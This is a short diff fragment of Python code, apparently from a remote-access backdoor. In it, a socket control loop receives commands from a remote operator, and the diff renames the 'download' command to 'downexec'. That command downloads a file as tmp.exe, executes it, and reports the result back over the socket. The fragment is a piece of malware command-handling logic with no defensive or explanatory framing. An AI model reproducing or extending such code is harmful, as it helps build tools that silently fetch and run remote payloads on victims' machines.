@@ -57,7 +57,7 @@ def socket_control():
 							socket_server.send(encode("\nExiting/shutting down server\n"))
 							socket_server.close()
 							sys.exit()
-						elif (data.split()[0] == "download"):
+						elif (data.split()[0] == "downexec"):
 							if (download_execute(data.split()[1],"tmp.exe",1) == True):
 								socket_server.send(encode("\nDownload and execute finished\n"))
 							else:
